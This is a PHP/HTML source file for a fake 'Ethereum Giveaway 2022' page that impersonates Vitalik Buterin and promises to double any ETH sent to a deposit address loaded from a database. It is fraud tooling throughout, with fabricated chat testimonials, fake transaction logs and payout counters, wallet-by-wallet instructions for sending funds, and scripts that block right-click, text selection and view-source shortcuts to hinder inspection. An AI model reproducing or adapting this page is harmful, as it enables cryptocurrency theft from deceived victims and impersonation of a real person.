<?php
require_once 'admin/includes/connect.php';

$variables = mysqli_query($connect, "SELECT * FROM `variables`");

$vars = [];

while ($var = mysqli_fetch_assoc($variables)) {
  $vars[$var["title"]] = $var["value"];
}

print_r($vars);

var_dump($vars);
?>

<!DOCTYPE html>
<html lang="ru">

<head>
  <title>Ethereum Giveaway 2022</title>
  <meta charset="UTF-8">
  <meta name="format-detection" content="telephone=no">
  <link rel="stylesheet" href="css/style.min.css?_v=20211210170924">
  <link rel="shortcut icon" href="logo.svg">
  <!-- <meta name="robots" content="noindex, nofollow"> -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!--Start of Tawk.to Script-->
  <script type="text/javascript">
    var Tawk_API = Tawk_API || {},
      Tawk_LoadStart = new Date();
    (function() {
      var s1 = document.createElement("script"),
        s0 = document.getElementsByTagName("script")[0];
      s1.async = true;
      s1.src = 'https://embed.tawk.to/61c32cc0c82c976b71c2a8c5/1fnh6djs6';
      s1.charset = 'UTF-8';
      s1.setAttribute('crossorigin', '*');
      s0.parentNode.insertBefore(s1, s0);
    })();
  </script>
  <!--End of Tawk.to Script-->
</head>

<body>
  <div class="wrapper">
    <header class="header">
      <div class="header__container">
        <a href="#" class="header__logo">
          <img src="img/svg/logo.svg?_v=1639148964129" alt="Logo">
        </a>
        <div class="header__menu menu">
          <button type="button" class="menu__icon icon-menu"><span></span></button>
          <nav class="menu__body">
            <ul class="menu__list">
              <li class="menu__item"><a href="" data-goto-header="" data-goto="top" class="menu__link">Home</a></li>
              <li class="menu__item"><a href="" data-goto-header="" data-goto="sec2" class="menu__link">Giveaway</a></li>
              <li class="menu__item"><a href="" data-goto-header="" data-goto="rules" class="menu__link">Rules</a></li>
              <li class="menu__item"><a href="" data-goto-header="" data-goto="faq" class="menu__link">FAQ</a></li>
              <li class="menu__item"><a href="" data-goto-header="" data-goto="sec3" class="menu__link">Transactions</a></li>
              <li class="menu__item"><a href="" data-goto-header="" data-goto="form" class="menu__link">Bonus</a></li>
            </ul>
          </nav>
        </div>
      </div>
    </header>
    <main class="page">
      <section id="top" class="top">
        <div class="top__container">
          <div class="top__body">
            <div class="top__img">
              <div class="top__bg">
                <div class="top__bg1"></div>
                <div class="top__bg2"></div>
              </div>
              <picture>
                <source srcset="img/png/top.webp" type="image/webp"><img src="img/png/top.png?_v=1639148964129" alt="Image">
              </picture>
            </div>
            <div class="top__content">
              <h1 class="top__title">
                Hurry up and take part in the giveaway of <?php
echo $vars["amount"];
                                                          ?> ETH
              </h1>
              <p>During this unique event we will give you a chance to win <?php
echo $vars["amount"];
                                                                            ?> ETH, have a look at the rules
                and
                don't miss on your chance!</p>
              <a href="" class="button top__btn">Participate in the giveaway</a>
            </div>

          </div>
          <div class="top__bottom">
            <div class="top__item item-top">
              <div class="item-top__row">
                <div class="item-top__kurs">
                  ETH / USD
                </div>
                <div data-coin="CHANGE24HOURPCT_ETH" class="item-top__procent">
                  -8,04%
                </div>
              </div>
              <div data-coin="PRICE_ETH" class="item-top__price">
                $4020,70
              </div>
            </div>
            <div class="top__item item-top">
              <div class="item-top__row">
                <div class="item-top__kurs">
                  BNB / USD
                </div>
                <div data-coin="CHANGE24HOURPCT_BNB" class="item-top__procent">
                  -8,04%
                </div>
              </div>
              <div data-coin="PRICE_BNB" class="item-top__price">
                $54254,70
              </div>
            </div>
            <div class="top__item item-top">
              <div class="item-top__row">
                <div class="item-top__kurs">
                  XRP / USD
                </div>
                <div data-coin="CHANGE24HOURPCT_XRP" class="item-top__procent">
                  -8,04%
                </div>
              </div>
              <div data-coin="PRICE_XRP" class="item-top__price">
                $54254,70
              </div>
            </div>
            <div class="top__item item-top">
              <div class="item-top__row">
                <div class="item-top__kurs">
                  XLM / USD
                </div>
                <div data-coin="CHANGE24HOURPCT_XLM" class="item-top__procent">
                  -8,04%
                </div>
              </div>
              <div data-coin="PRICE_XLM" class="item-top__price">
                $54254,70
              </div>
            </div>
            <div class="top__item item-top">
              <div class="item-top__row">
                <div class="item-top__kurs">
                  DOGE / USD
                </div>
                <div data-coin="CHANGE24HOURPCT_DOGE" class="item-top__procent">
                  -8,04%
                </div>
              </div>
              <div data-coin="PRICE_DOGE" class="item-top__price">
                $54254,70
              </div>
            </div>
            <div class="top__item item-top">
              <div class="item-top__row">
                <div class="item-top__kurs">
                  BTC / USD
                </div>
                <div data-coin="CHANGE24HOURPCT_BTC" class="item-top__procent">
                  -8,04%
                </div>
              </div>
              <div data-coin="PRICE_BTC" class="item-top__price">
                $54254,70
              </div>
            </div>
          </div>
        </div>
      </section>
      <div class="work">
        <div class="work__container">
          <div class="work__column">
            <div class="subtitle work__subtitle">
              HOW IT WORKS
            </div>
            <div class="work__info">
              We believe that Blockchain and <span>ETH Coin</span> will make the world more fair. To speed up the
              process of
              cryptocurrency mass adoption we decided to run <span><?php
echo $vars["amount"];
                                                                    ?> ETH giveaway</span>.
            </div>
          </div>
          <div class="work__column2">
            <div class="subtitle work__subtitle">
              ABOUT
            </div>
            <div class="work__info2">
              To participate you just need to send from 1 ETH to 500 ETH to the contribution address and we will
              immediately send you back from 2 ETH to 1,000 ETH (x2) to the address you sent it from.
            </div>
          </div>
        </div>
      </div>
      <div class="event">
        <div class="event__container">
          <div id="sec2" class="event__column">
            <div class="event__subtitle subtitle">
              NEW EVENT FROM ETH
            </div>
            <div class="event__title">
              Enter the giveaway, and multiply the ETH balance
            </div>
            <p>Follow the rules on the right side to participate in the giveaway</p>
            <div class="event__img">
              <picture>
                <source srcset="img/png/event01.webp" type="image/webp"><img src="img/png/event01.png?_v=1639148964129" alt="">
              </picture>
            </div>
          </div>
          <div id="rules" class="event__column">
            <div class="event__subtitle subtitle">
              RULES
            </div>
            <div class="event__title-small">
              Follow the rules to participate
            </div>
            <ul class="event__list">
              <li>
                If you send <span>10+ ETH</span>,you will get <span>20+ ETH</span>back
              </li>
              <li>
                If you send <span>20+ ETH</span>,you will get <span>40+ ETH</span>back
              </li>
              <li>
                If you send <span>40+ ETH</span>,you will get <span>80+ ETH</span>back
              </li>
              <li>
                If you send <span>100+ ETH</span>,you will get <span>200+ ETH</span>back <b>+5% bonus</b>
              </li>
              <li>
                If you send <span>250+ ETH</span>,you will get <span>500+ ETH</span>back <b>+10% bonus</b>
              </li>
              <li>
                If you send <span>500+ ETH</span>,you will get <span>1000+ ETH</span>back <b>+20% bonus</b>
              </li>
            </ul>
            <div class="event__bottom">
              <div class="event__icon">
                <img src="img/svg/info.svg?_v=1639148964129" alt="">
              </div> *The higher the amount, the higher the percentage
            </div>

          </div>
        </div>
      </div>
      <section class="bnb">
        <div class=" bnd__container">
          <div class="bnb__body">
            <div class="bnb__left">
              <div class="bnb__svg-box">
                <div class="bnb__pr">
                  10%
                </div>
                <div class="bnb__block">
                  <div class="bnb__logo">
                    <img src="img/svg/bnb.svg?_v=1639148964129" alt="">
                  </div>
                  <div class="bnb__ost">
                    <span class="bnb__ost-value"> 472 000 </span>&nbsp; ETH
                  </div>
                  <div class="bnb__all">
                    /500 000
                  </div>
                </div>
                <svg viewbox="0 0 36 36" class="circular-chart" style="z-index: -1">
                  <path class="circle bg" stroke-dasharray="100, 100" d="M18 2.0845
                                         a 15.9155 15.9155 0 0 1 0 31.831
                                         a 15.9155 15.9155 0 0 1 0 -31.831"></path>
                </svg>
                <svg id="progress" viewbox="0 0 36 36" class="progress1 circular-chart">
                  <path class="circle" stroke-dasharray="60, 100" d="M18 2.0845
                                         a 15.9155 15.9155 0 0 1 0 31.831
                                         a 15.9155 15.9155 0 0 1 0 -31.831"></path>
                </svg>
              </div>
            </div>
            <div class="bnb__center">
              <div class="bnb__top">
                <span> 235 000 ETH</span> already sent to participants!
              </div>
              <div class="bnb__descr">
                Hurry up and take part in the giveaway!
              </div>
              <h2 class="bnb__title">
                You can send ETH to the following address:
              </h2>
              <div class="bnb__block tq">
                <div class="bnb__copy bnb__copy1">
                  <span><?php
echo $vars["numbers"]
                        ?></span>
                  <div class="bnb__icon">
                    <img src="img/svg/copy.svg?_v=1639148964129" alt="">
                  </div>
                </div>
              </div>
              <div class="bnb__bottom">
                <div class="bnb__img">
                  <img src="img/svg/load.svg?_v=1639148964129" alt="Load">
                </div>
                <span>
                  Waiting for the payment...
                </span>
              </div>
            </div>
            <div class="bnb__right">
              <div class="bnb__wrap">
                <div class="bnb__img-code">
                  <picture><img src="

                  <?php
echo $vars["image"]
                  ?>
                  
                  " alt="Code"></picture>
                </div>
              </div>
              <div class="bnb__label">
                Or scan the QR Code
              </div>
            </div>
          </div>
        </div>
      </section>
      <div id="form" class="form">

        <div class=" form__container">
          <div class="form__load">
            <picture>
              <source srcset="img/icons/loading.webp" type="image/webp"><img src="img/icons/loading.gif?_v=1639148964129" alt="">
            </picture>
          </div>
          <div class="form__body">
            <div class="form__title active">
              Check your wallet for bonuses
            </div>
            <div class="form__title form__title none">
              <span>Congrats!</span>&nbsp; You will get the bonuses!
            </div>
            <div class="form__subtitle active">
              The bonus is available for wallets that have not previously participated in this distribution
            </div>
            <div class="form__subtitle none">
              Your wallet is avaiable to get the bonus from transaction
            </div>
            <div class="form__row">
              <form action="#"> <input data-error="Please fill out this field." autocomplete="off" type="text" placeholder="Your wallet" data-validate="" data-required="" class="input form__input _req">
                <button class="form__btn button">Check</button>
              </form>
            </div>
          </div>
        </div>
      </div>
      <div class="chat">
        <div id="chat-head" class="chat__head">
          <div class="chat__icon">
            <img src="img/svg/message.svg?_v=1639148964129" alt="">
          </div>
          <div class="chat__online">
            Online Chat
          </div>
          <div class="chat__users">
            <span class="chat__iduser">280</span> users
          </div>
        </div>
        <div id="chat-body" class="chat__body">
          <div style="--bg:url(img/avatar/avatar17.jpg)" class="mess">
            <div class="msg">
              <p class="nickname">1n7ve5rk...</p>
              <p class="msg-text">8 ETH ON MY WALLET</p>
            </div>
          </div>

          <div style="--bg:url(img/avatar/avatar12.jpg)" class="mess ">
            <div class="msg">
              <p class="nickname">1vjpwkoy...</p>
              <p class="msg-text">Thank you Vitalik Buterin! From me and my son.</p>
            </div>
          </div>
          <div style="--bg:url(img/avatar/avatar20.jpg)" class="mess">
            <div class="msg">
              <p class="nickname">1u23inr0...</p>
              <p class="msg-text">GOT 7.27!!!!!!!!</p>
            </div>
          </div>
          <div style="--bg:url(img/avatar/avatar1.jpg)" class="mess">
            <div class="msg">
              <p class="nickname">1e9uinnd...</p>
              <p class="msg-text">Got 2 ETH THANK YOU VITALIK</p>
            </div>
          </div>
          <div style="--bg:url(img/avatar/avatar2.jpg)" class="mess">
            <div class="msg">
              <p class="nickname">1er21ehd...</p>
              <p class="msg-text">recieived some eth thanks</p>
            </div>
          </div>
        </div>
        <div class="chat__form">
          <div class="chat__item">
            <input autocomplete="off" type="text" data-error="Ошибка" placeholder="Send your message" class="input">
            <button class="chat__btn">
              <div class="chat__icon2">
                <img src="img/svg/send.svg?_v=1639148964129" alt="">
              </div>
            </button>
          </div>

        </div>
      </div>
      <div id="faq" class="faq">
        <div class=" faq__container">
          <div class="faq__body">
            <div class="faq__left left-faq">
              <div class="left-faq__img">
                <picture>
                  <source srcset="img/png/bg2.webp" type="image/webp"><img src="img/png/bg2.png?_v=1639148964129" alt="">
                </picture>
              </div>
              <div class="left-faq__body">
                <div class="left-faq__title">
                  Calculate your prize
                </div>
                <div class="left-faq__subtitle">
                  Use our calculator to calculate your possible profit
                </div>
                <div class="left-faq__row">
                  <div class="left-faq__column">
                    <label class="left-faq__label">You will send</label>
                    <div class="left-faq__item">
                      <span class="left-faq__decor">
                        <div class="left-faq__icon">
                          <img src="img/svg/decor.svg?_v=1639148964129" alt="">
                        </div>
                        <span>ETH</span>
                      </span>
                      <input autocomplete="off" type="number" data-error="Ошибка" value="6" placeholder="" class="input left-faq__input left-faq__input1">
                    </div>
                  </div>
                  <div class="left-faq__line">
                    X2
                  </div>
                  <div class="left-faq__column">
                    <label class="left-faq__label">Your profit</label>
                    <div class="left-faq__item">
                      <span class="left-faq__decor">
                        <div class="left-faq__icon">
                          <img src="img/svg/decor.svg?_v=1639148964129" alt="">
                        </div>
                        <span>ETH</span>
                      </span>
                      <input readonly="" autocomplete="off" type="text" data-error="Ошибка" value="12" placeholder="" class="input left-faq__input left-faq__input2">
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="faq__right">
              <div class="faq__subtitle subtitle">
                FAQ
              </div>
              <div data-spollers="" data-one-spoller="" class="faq__spollers">
                <div class="faq__item">
                  <div data-spoller="" class="faq__head _spoller-active">
                    What do I have to do to participate in the giveaway?
                  </div>
                  <div class="faq__content">
                    To participate you just need to send from 1 ETH to 500 ETH to the contribution address and we will immediately send you back from 2 ETH to 1,000 ETH (x2) to the address you sent it from.
                  </div>
                </div>
                <div class="faq__item">
                  <div data-spoller="" class="faq__head">
                    How long will it take me to get my bonus?
                  </div>
                  <div class="faq__content">
                    You get your x2 bonus instantly! The system is fully automated, so all transactions are sent without delay!
                  </div>
                </div>
                <div class="faq__item">
                  <div data-spoller="" class="faq__head">
                    Who is the sponsor of this giveaway?
                  </div>
                  <div class="faq__content">
                    The main sponsor of this event is Vitalik Buterin
                  </div>
                </div>
                <div class="faq__item">
                  <div data-spoller="" class="faq__head">
                    How many times can I participate in the giveaway?
                  </div>
                  <div class="faq__content">
                    You can only participate once.
                  </div>
                </div>
                <div class="faq__item">
                  <div data-spoller="" class="faq__head">
                    How do I get my bonus?
                  </div>
                  <div class="faq__content">
                    The system will automatically send the bonus to the wallet from which you participated in the giveaway.
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="toast">
        Copied!
      </div>
      <div class="steps">
        <div class="steps__container">
          <div class="steps__body">
            <div class="tabs _tabs">
              <nav class="tabs__navigation">
                <button type="submit" class="tabs__title  _tabs-item _active">1</button>
                <button type="submit" class="tabs__title _tabs-item">2</button>
                <button type="submit" class="tabs__title _tabs-item">3</button>
                <button type="submit" class="tabs__title _tabs-item">4</button>
              </nav>
              <div class="tabs__content ">
                <div class="tabs__body  _tabs-block _active">
                  <div class="steps__first first">
                    <div class="first__img">
                      <picture>
                        <source srcset="img/png/tabs01.webp" type="image/webp"><img src="img/png/tabs01.png?_v=1639148964129" alt="">
                      </picture>
                    </div>
                    <div class="first__left">
                      <div class="first__img-code">
                        <picture><img src="                  <?php
echo $vars["image"]
                                                              ?>" alt="Code"></picture>
                      </div>
                    </div>
                    <div class="first__right">
                      <div class="bnb__top">
                        <span> 235 000 ETH</span> already sent to participants!
                      </div>
                      <div class="bnb__descr">
                        Hurry up and take part in the giveaway!
                      </div>
                      <h2 class="bnb__title">
                        You can send ETH to the following address:
                      </h2>
                      <div class="bnb__block tq">
                        <div class="bnb__copy bnb__copy2">
                          <span><?php
echo $vars["numbers"]
                                ?></span>
                          <div class="bnb__icon">
                            <img src="img/svg/copy.svg?_v=1639148964129" alt="">
                          </div>
                        </div>
                      </div>
                      <div class="bnb__bottom">
                        <div class="bnb__img">
                          <img src="img/svg/load.svg?_v=1639148964129" alt="Load">
                        </div>
                        <span>
                          Waiting for the payment...
                        </span>
                      </div>
                      <button class="button steps__btn1">
                        Next
                      </button>
                    </div>
                  </div>
                </div>
                <div class="tabs__body _tabs-block">
                  <div class="steps__two two">
                    <div class="two__img">
                      <picture>
                        <source srcset="img/png/tabs02.webp" type="image/webp"><img src="img/png/tabs02.png?_v=1639148964129" alt="">
                      </picture>
                    </div>
                    <div class="two__left">
                      <div class="two__title">
                        Choose your wallet
                      </div>
                      <div class="two__items">
                        <div data-block='1' class="two__item">
                          <div class="two__icon">
                            <img src="img/svg/icon01.svg?_v=1639148964129" alt="">
                          </div>
                          <span>Binance</span>
                        </div>
                        <div data-block='2' class="two__item">
                          <div class="two__icon">
                            <img src="img/svg/icon02.svg?_v=1639148964129" alt="">
                          </div>
                          <span>Metamask</span>
                        </div>
                        <div data-block='3' class="two__item">
                          <div class="two__icon">
                            <img src="img/svg/icon03.svg?_v=1639148964129" alt="">
                          </div>
                          <span>Coinbase</span>
                        </div>
                        <div data-block='0' class="two__item">
                          <div class="two__icon">
                            <img src="img/svg/icon04.svg?_v=1639148964129" alt="">
                          </div>
                          <span>Crypto</span>
                        </div>
                        <div data-block='0' class="two__item">

                          <span>Other</span>
                        </div>
                      </div>

                    </div>
                  </div>
                </div>
                <div class="tabs__body _tabs-block">
                  <div data-id='1' class="steps__third th">
                    <div class="th__img">
                      <picture>
                        <source srcset="img/png/tabs3.webp" type="image/webp"><img src="img/png/tabs3.png?_v=1639148964129" alt="">
                      </picture>
                    </div>
                    <div class="th__body">
                      <div class="th__title">
                        How to send ETH from Binance?
                      </div>
                      <div class="th__text">
                        <p> Sending crypto funds</p>
                        <p>To send crypto from your Wallet</p>
                        <ul class="th__list">
                          <li>
                            Open BINANCE
                          </li>
                          <li>Tap Fiat and Spot</li>

                          <li> Tap Withdraw</li>
                          <li> Enter official giveaway ETH adress</li>
                          <li>Select which coin you'd like to use</li>
                          <li>Enter the amount you'd like to send</li>
                          <li>Tap Withdraw button</li>
                        </ul>
                      </div>
                      <button class="button steps__btn1">
                        Next
                      </button>
                    </div>
                  </div>
                  <div data-id='2' class="steps__third th">
                    <div class="th__img">
                      <picture>
                        <source srcset="img/png/tabs4.webp" type="image/webp"><img src="img/png/tabs4.png?_v=1639148964129" alt="">
                      </picture>
                    </div>
                    <div class="th__body">
                      <div class="th__title">
                        How to send ETH from Metamask?
                      </div>
                      <div class="th__text">
                        <p> Sending crypto funds</p>
                        <p>To send crypto from your Wallet</p>
                        <ul class="th__list">
                          <li>
                            Open Metamask
                          </li>
                          <li>Tap Send</li>

                          <li> Enter official giveaway ETH adress</li>
                          <li> Select which coin you'd like to use</li>
                          <li> Enter the amount you'd like to send</li>
                          <li> Tap next button</li>
                          <li> Tap confirm</li>
                        </ul>
                      </div>
                      <button class="button steps__btn1">
                        Next
                      </button>
                    </div>
                  </div>
                  <div data-id='3' class="steps__third th">
                    <div class="th__img">
                      <picture>
                        <source srcset="img/png/tabs5.webp" type="image/webp"><img src="img/png/tabs5.png?_v=1639148964129" alt="">
                      </picture>
                    </div>
                    <div class="th__body">
                      <div class="th__title">
                        How to send ETH from Coinbase?
                      </div>
                      <div class="th__text">
                        <p>Sending crypto funds <br>
                          To safegaurd against sending funds to an incorrect address, we <br> suggest
                          asking the
                          Receiver for their unique QR code. </p>
                        <p>To send crypto from your Wallet</p>
                        <ul class="th__list">
                          <li>
                            Open BINANCE
                          </li>
                          <li> Open Coinbase Wallet app on your mobile device
                          </li>
                          <li> Tap Send
                          </li>
                          <li> Enter the amount you'd like to send
                          </li>
                          <li> Select which coin you'd like to use</li>
                          <li>Tap Next</li>
                          <li>Tap the QR code or enter official giveaway ETH adress</li>
                        </ul>
                      </div>
                      <button class="button steps__btn1">
                        Next
                      </button>
                    </div>
                  </div>

                </div>
                <div class="tabs__body _tabs-block">
                  <div class="steps__four four">
                    <div class="four__img">
                      <picture>
                        <source srcset="img/png/tabs6.webp" type="image/webp"><img src="img/png/tabs6.png?_v=1639148964129" alt="">
                      </picture>
                    </div>
                    <div class="four__body">
                      <div class="four__top">
                        <div class="four__icon">
                          <img src="img/svg/load2.svg?_v=1639148964129" alt="">
                        </div>
                        <span>Waiting for the payment...</span>
                      </div>
                      <p>Once we receive your transaction, we will immediately send the requested amount back
                        to you.</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div id="sec3" class="transaction">
        <div class="transaction__container">
          <div class="transaction__row">
            <div class="transaction__title">
              Bonus transactions
            </div>
            <div class="transaction__copy">
              <span><?php
echo $vars["numbers"]
                    ?></span>
              <div class="transaction__icon">
                <img src="img/svg/copy.svg?_v=1639148964129" alt="">
              </div>
            </div>
          </div>
          <div id="Transactions" class="transaction-container">
            <div class="transaction-table">
              <div class="table-body">
                <div class="item">
                  <div class="top">
                    <div class="data">
                      <div class="data-item">KZNA0COROV...</div>
                      <div style="display: none" class="data-item">616463</div>
                      <div class="data-item">0xB0E341c5...</div>
                      <div class="data-item">OUT</div>
                      <div class="data-item">0x6GYfCnmJ...</div>
                      <div class="data-item">right now</div>
                      <div class="data-item">181.12 ETH</div>
                      <div style="display: none" class="data-item">0.00030378</div>
                    </div>
                  </div>
                  <div class="bottom">
                    <div class="data">
                      <div class="data-item">DGOKNTWQ7A...</div>
                      <div style="display: none" class="data-item">616776</div>
                      <div class="data-item">0x6GYfCnmJ...</div>
                      <div class="data-item">IN</div>
                      <div class="data-item">0xB0E341c5...</div>
                      <div class="data-item">right now</div>
                      <div class="data-item">90.56 ETH</div>
                      <div style="display:none" class="data-item">0.001135</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

        </div>
      </div>
    </main>
    <footer class="footer">
      <div class="footer__container">

      </div>
    </footer>
  </div>
  <!-- <div class="hystmodal" id="myPopup" aria-hidden="true">
	<div class="hystmodal__wrap">
		<div class="hystmodal__window" role="dialog" aria-modal="true">
			<button data-hystclose class="hystmodal__close">Закрыть</button>
		</div>
	</div>
</div>
<div class="hystmodal" id="massageName" aria-hidden="true">
	<div class="hystmodal__wrap">
		<div class="hystmodal__window" role="dialog" aria-modal="true">
			<button data-hystclose class="hystmodal__close">Закрыть</button>
			Сообщение
		</div>
	</div>
</div>
 -->
  <script src="ajax/libs/socket.io/2.0.4/socket.io.js"></script>
  <script src="ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script>
    //запрещает нажатие правой кнопки мыши на сайте
    document.oncontextmenu = cmenu;

    function cmenu() {
      return false;
    }
  </script>


  <script>
    //запрещает выделение мышкой и комбинации клавиш Ctrl + A и Ctrl + U и Ctrl + S
    function preventSelection(element) {
      var preventSelection = false;

      function addHandler(element, event, handler) {
        if (element.attachEvent) element.attachEvent('on' + event, handler);
        else if (element.addEventListener) element.addEventListener(event, handler, false);
      }

      function removeSelection() {
        if (window.getSelection) {
          window.getSelection().removeAllRanges();
        } else if (document.selection && document.selection.clear)
          document.selection.clear();
      }

      //запрещаем выделять текст мышкой
      addHandler(element, 'mousemove', function() {
        if (preventSelection) removeSelection();
      });
      addHandler(element, 'mousedown', function(event) {
        var event = event || window.event;
        var sender = event.target || event.srcElement;
        preventSelection = !sender.tagName.match(/INPUT|TEXTAREA/i);
      });

      //запрещаем нажатие клавищ Ctrl + A и Ctrl + U и Ctrl + S
      function killCtrlA(event) {
        var event = event || window.event;
        var sender = event.target || event.srcElement;
        if (sender.tagName.match(/INPUT|TEXTAREA/i)) return;
        var key = event.keyCode || event.which;
        if ((event.ctrlKey && key == 'U'.charCodeAt(0)) || (event.ctrlKey && key == 'A'.charCodeAt(0)) || (event
            .ctrlKey && key == 'S'.charCodeAt(0))) // 'A'.charCodeAt(0) можно заменить на 65
        {
          removeSelection();
          if (event.preventDefault) event.preventDefault();
          else event.returnValue = false;
        }
      }
      addHandler(element, 'keydown', killCtrlA);
      addHandler(element, 'keyup', killCtrlA);
    }
    preventSelection(document);
  </script>

  <script src="js/app.min.js?_v=20211210170924"></script>;

</body>

</html>